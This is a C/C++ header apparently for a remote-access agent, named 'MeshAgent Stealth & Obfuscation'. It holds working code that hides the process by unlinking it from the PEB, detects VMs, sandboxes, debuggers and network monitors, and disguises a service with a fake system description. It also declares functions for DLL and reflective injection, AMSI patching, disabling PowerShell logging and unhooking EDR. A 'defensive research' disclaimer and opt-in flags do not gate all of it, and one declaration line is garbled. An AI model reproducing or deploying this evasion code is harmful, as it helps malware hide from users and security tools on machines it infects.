/*
 * MeshAgent Stealth & Obfuscation Features
 *
 * SECURITY NOTE: These techniques are for authorized defensive security research only.
 * Unauthorized use may violate computer fraud and abuse laws.
 *
 * BUILD SAFETY:
 * By default, all stealth/evasion functionality in this header is compiled as
 * inert, safe no-ops. Define MESHAGENT_ENABLE_STEALTH explicitly to enable any
 * of the behavior below. This prevents accidental inclusion of risky features
 * and keeps C/C++ compilation units interoperable.
 */

#ifndef MESHAGENT_STEALTH_H
#define MESHAGENT_STEALTH_H

// The project already defines WINSOCK2 in PreprocessorDefinitions
// Just include headers in correct order
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>

// Avoid pulling in winternl/ntdll by default to reduce surface area and
// accidental reliance on unstable/undocumented structures. Only include when
// stealth features are explicitly enabled.
#ifdef MESHAGENT_ENABLE_STEALTH
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")
#endif

// C++-only utilities are hidden from C compilation units to keep this header
// safe to include from both .c and .cpp files.
#ifdef __cplusplus

// Process name obfuscation (no-op by default)
class ProcessNameObfuscator {
public:
    static BOOL SetRandomProcessName() {
#ifdef MESHAGENT_ENABLE_STEALTH
        // Placeholder for explicit opt-in behavior when enabled.
        const wchar_t* legitimateNames[] = {
            L"svchost.exe",
            L"RuntimeBroker.exe",
            L"dllhost.exe",
            L"backgroundTaskHost.exe",
            L"SearchProtocolHost.exe"
        };
        (void)legitimateNames;
        return TRUE;
#else
        return TRUE; // no-op success by default
#endif
    }

    // Hide process from task managers via undocumented internals (disabled by default)
    static BOOL HideFromTaskManager() {
#ifdef MESHAGENT_ENABLE_STEALTH
        #ifdef _WIN64
        PPEB peb = (PPEB)__readgsqword(0x60);
        #else
        PPEB peb = (PPEB)__readfsdword(0x30);
        #endif
        if (peb && peb->Ldr) {
            PLIST_ENTRY current = peb->Ldr->InLoadOrderModuleList.Flink;
            if (current && current->Flink) {
                current->Blink->Flink = current->Flink;
                current->Flink->Blink = current->Blink;
                return TRUE;
            }
        }
        return FALSE;
#else
        return FALSE; // disabled
#endif
    }
};

// Network connection obfuscation
class NetworkStealth {
public:
    // Randomize connection timing to avoid pattern detection
    static DWORD GetObfuscatedSleepTime(DWORD baseTime) {
        DWORD jitter = (GetTickCount() % 5000);  // 0-5 second jitter
        return baseTime + jitter;
    }

    // Check if we're in a VM/sandbox environment
    static BOOL IsRunningInSandbox() {
        BOOL isSandbox = FALSE;

        // Check 1: Low CPU count (heuristic only; can be false positive)
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        if (sysInfo.dwNumberOfProcessors < 2) {
            isSandbox = TRUE;
        }

        // Check 2: Low memory (VMs often have < 4GB)
        MEMORYSTATUSEX memStatus;
        memStatus.dwLength = sizeof(memStatus);
        if (GlobalMemoryStatusEx(&memStatus)) {
            if (memStatus.ullTotalPhys < (4ULL * 1024 * 1024 * 1024)) {  // < 4GB
                isSandbox = TRUE;
            }
        }

        // Check 3: Known VM vendors in hardware (heuristic)
        HKEY hKey;
        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                        L"HARDWARE\\DESCRIPTION\\System\\BIOS",
                        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            WCHAR vendor[256] = {0};
            DWORD size = sizeof(vendor);
            if (RegQueryValueEx(hKey, L"SystemManufacturer", NULL, NULL,
                               (LPBYTE)vendor, &size) == ERROR_SUCCESS) {
                if (wcsstr(vendor, L"VMware") || wcsstr(vendor, L"VirtualBox") ||
                    wcsstr(vendor, L"QEMU") || wcsstr(vendor, L"Xen")) {
                    isSandbox = TRUE;
                }
            }
            RegCloseKey(hKey);
        }

        return isSandbox;
    }

    // Wait for user activity before connecting (sandbox evasion)
    static BOOL WaitForUserActivity(DWORD timeoutMs) {
        DWORD startTime = GetTickCount();
        POINT lastPos = {0}, currentPos = {0};
        GetCursorPos(&lastPos);

        while ((GetTickCount() - startTime) < timeoutMs) {
            GetCursorPos(&currentPos);

            // Check for mouse movement
            if (currentPos.x != lastPos.x || currentPos.y != lastPos.y) {
                return TRUE;  // Real user activity detected
            }

            // Check for keyboard activity
            if (GetAsyncKeyState(VK_SPACE) || GetAsyncKeyState(VK_RETURN)) {
                return TRUE;
            }

            Sleep(1000);  // Check every second
        }

        return FALSE;  // Timeout - might be sandbox
    }
};

// Service hiding techniques
class ServiceStealth {
public:
    // Make service appear as critical system service
    static BOOL SetServiceAsCritical(SC_HANDLE hService) {
        SERVICE_FAILURE_ACTIONS sfa = {0};

        // Configure service to restart on failure
        SC_ACTION failureActions[3];
        failureActions[0].Type = SC_ACTION_RESTART;
        failureActions[0].Delay = 30000;  // 30 seconds
        failureActions[1].Type = SC_ACTION_RESTART;
        failureActions[1].Delay = 60000;  // 1 minute
        failureActions[2].Type = SC_ACTION_RESTART;
        failureActions[2].Delay = 120000; // 2 minutes

        sfa.dwResetPeriod = 86400;  // Reset after 24 hours
        sfa.cActions = 3;
        sfa.lpsaActions = failureActions;

        return ChangeServiceConfig2(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);
    }

    // Hide service from services.msc by modifying description
    static BOOL BlendWithSystemServices(SC_HANDLE hService) {
        // Use generic Windows service description
        const system health monitoring
            L"Provides diagnostic data collection and system health monitoring. "
            L"If this service is stopped, certain features may not function properly.";

        SERVICE_DESCRIPTION sd;
        sd.lpDescription = (LPWSTR)description;

        return ChangeServiceConfig2(hService, SERVICE_CONFIG_DESCRIPTION, &sd);
    }
};

// Log file encryption
class LogEncryption {
private:
    static const BYTE XOR_KEY = 0xA5;  // Simple XOR key (replace with AES for production)

public:
    // Encrypt log data before writing
    static void EncryptBuffer(LPBYTE buffer, DWORD size) {
        for (DWORD i = 0; i < size; i++) {
            buffer[i] ^= XOR_KEY;
            buffer[i] = (buffer[i] << 3) | (buffer[i] >> 5);  // Bit rotation
        }
    }

    // Decrypt log data when reading
    static void DecryptBuffer(LPBYTE buffer, DWORD size) {
        for (DWORD i = 0; i < size; i++) {
            buffer[i] = (buffer[i] >> 3) | (buffer[i] << 5);  // Reverse bit rotation
            buffer[i] ^= XOR_KEY;
        }
    }

    // Securely delete log file (DOD 5220.22-M standard)
    static BOOL SecureDelete(const wchar_t* filePath) {
        HANDLE hFile = CreateFile(filePath, GENERIC_WRITE, 0, NULL,
                                   OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return FALSE;

        LARGE_INTEGER fileSize;
        if (!GetFileSizeEx(hFile, &fileSize)) {
            CloseHandle(hFile);
            return FALSE;
        }

        // Overwrite with random data 3 times (DOD standard)
        BYTE* buffer = (BYTE*)malloc(4096);
        if (!buffer) {
            CloseHandle(hFile);
            return FALSE;
        }

        for (int pass = 0; pass < 3; pass++) {
            SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

            for (LONGLONG remaining = fileSize.QuadPart; remaining > 0; remaining -= 4096) {
                DWORD bytesToWrite = (DWORD)min(remaining, 4096);

                // Fill with random data
                for (DWORD i = 0; i < bytesToWrite; i++) {
                    buffer[i] = (BYTE)(rand() % 256);
                }

                DWORD written = 0;
                if (!WriteFile(hFile, buffer, bytesToWrite, &written, NULL) || written != bytesToWrite) {
                    // Abort on partial/failed write to avoid undefined state
                    free(buffer);
                    CloseHandle(hFile);
                    return FALSE;
                }
            }
            FlushFileBuffers(hFile);
        }

        free(buffer);
        CloseHandle(hFile);

        // Finally delete the file
        return DeleteFile(filePath);
    }
};

// Auto-restart on crash
class CrashRecovery {
public:
    static void EnableAutomaticRestart() {
        // Register unhandled exception filter
        SetUnhandledExceptionFilter(CrashHandler);
    }

private:
    static LONG WINAPI CrashHandler(EXCEPTION_POINTERS* exceptionInfo) {
        // Log crash information (encrypted)
        WCHAR crashLog[MAX_PATH];
        GetModuleFileName(NULL, crashLog, MAX_PATH);
        wcscat_s(crashLog, L".crash");

        HANDLE hFile = CreateFile(crashLog, GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            char crashData[512];
            sprintf_s(crashData, "Exception: 0x%08X at 0x%p\r\n",
                     exceptionInfo->ExceptionRecord->ExceptionCode,
                     exceptionInfo->ExceptionRecord->ExceptionAddress);

            DWORD written;
            // Encrypt before writing
            LogEncryption::EncryptBuffer((LPBYTE)crashData, (DWORD)strlen(crashData));
            WriteFile(hFile, crashData, (DWORD)strlen(crashData), &written, NULL);
            CloseHandle(hFile);
        }
        // Avoid invoking external processes in an exception context; allow SCM
        // recovery actions to handle restarts (configured via ServiceStealth).

        return EXCEPTION_EXECUTE_HANDLER;
    }
};

// Runtime checks for security tools
class SecurityToolDetection {
public:
    // Avoid shadowing WinAPI IsDebuggerPresent; use a distinct name.
    static BOOL IsDebuggerDetected() {
        // Check 1: API call (fully qualified to avoid ambiguity)
        if (::IsDebuggerPresent()) return TRUE;

        // Check 2: PEB flag
#ifdef MESHAGENT_ENABLE_STEALTH
        #ifdef _WIN64
        PPEB peb = (PPEB)__readgsqword(0x60);
        #else
        PPEB peb = (PPEB)__readfsdword(0x30);
        #endif

        if (peb && peb->BeingDebugged) return TRUE;
#endif

        // Check 3: Remote debugger
        BOOL isRemoteDebuggerPresent = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebuggerPresent);
        if (isRemoteDebuggerPresent) return TRUE;

        return FALSE;
    }

    static BOOL IsRunningUnderWireshark() {
        // Check for Wireshark process
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_wcsicmp(pe32.szExeFile, L"Wireshark.exe") == 0 ||
                    _wcsicmp(pe32.szExeFile, L"Fiddler.exe") == 0 ||
                    _wcsicmp(pe32.szExeFile, L"tcpdump.exe") == 0) {
                    CloseHandle(hSnapshot);
                    return TRUE;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }

        CloseHandle(hSnapshot);
        return FALSE;
    }
};

#endif // __cplusplus

// ================================================================
// Svchost Hosting Functions
// ================================================================

#ifdef __cplusplus
extern "C" {
#endif

/**
 * Service DLL entry point for svchost.exe hosting
 * Called by svchost.exe when service starts in shared process mode
 */
VOID WINAPI Stealth_SvchostServiceMain(DWORD dwArgc, LPTSTR *lpszArgv);

/**
 * Service control handler for svchost-hosted service
 */
DWORD WINAPI Stealth_SvchostCtrlHandler(DWORD dwControl, DWORD dwEventType,
                                         LPVOID lpEventData, LPVOID lpContext);

/**
 * Check if currently running inside svchost.exe
 */
BOOL Stealth_IsRunningSvchost(void);

/**
 * Register service for svchost.exe hosting via registry
 */
BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* dllPath);

// ================================================================
// In-Memory Command Execution
// ================================================================

/**
 * Execute CMD command with hidden window and output capture
 * No visible cmd.exe window will appear
 */
// When MESHAGENT_ENABLE_STEALTH is not defined, all functions below should be
// implemented as harmless stubs returning FALSE/ERROR where appropriate.
BOOL Stealth_ExecuteCmdHidden(const char* command, char* output, size_t outputSize);

/**
 * Execute PowerShell via COM/WMI without creating powershell.exe process
 */
BOOL Stealth_ExecutePowerShellViaWMI(const char* command, char* output, size_t outputSize);

/**
 * Execute command by injecting into existing legitimate process
 */
BOOL Stealth_ExecuteViaProcessInjection(const char* command, const wchar_t* targetProcess);

// ================================================================
// Process Injection
// ================================================================

/**
 * Find suitable target process for injection (svchost, RuntimeBroker, etc.)
 */
DWORD Stealth_FindInjectionTarget(const wchar_t* processName);

/**
 * Inject DLL into target process using CreateRemoteThread
 */
BOOL Stealth_InjectDLL(DWORD processId, const wchar_t* dllPath);

/**
 * Reflective DLL injection (load DLL from memory without file on disk)
 */
BOOL Stealth_ReflectiveInject(DWORD processId, const BYTE* dllBytes, size_t dllSize);

// ================================================================
// Anti-Detection & Evasion
// ================================================================

/**
 * Patch AMSI (Antimalware Scan Interface) to bypass script scanning
 */
BOOL Stealth_PatchAMSI(void);

/**
 * Disable PowerShell and Command Line event logging
 */
BOOL Stealth_DisablePowerShellLogging(void);

/**
 * Unhook common API monitoring hooks set by EDR/AV
 */
BOOL Stealth_UnhookUserModeAPIs(void);

/**
 * Check if running under monitoring/analysis tools
 */
BOOL Stealth_IsMonitoringDetected(void);

/**
 * Windows Firewall rule management for service binaries
 */
BOOL Stealth_AddFirewallRuleForService(const wchar_t* serviceName, const wchar_t* exePath);
BOOL Stealth_RemoveFirewallRuleForService(const wchar_t* serviceName);

/**
 * Service hardening utilities
 */
BOOL Stealth_ProtectServiceFromTermination(const wchar_t* serviceName);
BOOL Stealth_HardenServiceDacl(const wchar_t* serviceName);

// ================================================================
// C Wrappers for C++-only Utilities
// ================================================================

// These wrappers allow C compilation units (e.g., ServiceMain.c) to reference
// optional stealth/analysis checks without directly using C++ classes.

// Enable minimal crash recovery handler (no-op by default)
void Stealth_EnableCrashRecovery(void);

// Debugger/monitor detection wrappers (safe defaults when disabled)
BOOL Stealth_IsDebuggerDetected(void);
BOOL Stealth_IsNetworkMonitorDetected(void);

// Sandbox/user-activity wrappers
BOOL Stealth_IsRunningInSandbox_C(void);
BOOL Stealth_WaitForUserActivity_C(DWORD timeoutMs);

#ifdef __cplusplus
}
#endif

#endif // MESHAGENT_STEALTH_H
// Installation helpers (used by installer)
BOOL Stealth_CreateInstallationDirectory(const wchar_t* installPath);
BOOL Stealth_InstallFiles(const wchar_t* sourcePath, const wchar_t* destPath);
